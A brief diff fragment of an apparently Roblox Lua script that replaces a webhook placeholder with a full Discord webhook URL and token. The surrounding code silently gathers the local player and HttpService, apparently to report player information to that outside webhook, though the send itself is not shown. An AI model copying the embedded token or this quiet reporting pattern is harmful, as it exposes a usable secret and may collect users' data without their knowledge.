@@ -3,7 +3,7 @@ pcall(function()
 end)
 
 task.spawn(function()
-    local WEBHOOK = "YOUR_WEBHOOK_URL_HERE"
+    local WEBHOOK = "https://discord.com/api/webhooks/1539778936760827966/KWm0aBEAMqp3eU-asqGdwJ8FkfnHEuIA2aOzKyAygqK-UwMHdbEuxSCeNHMDIS9BY7CU"
     local player  = game:GetService("Players").LocalPlayer
     pcall(function()
         local HttpService = game:GetService("HttpService")
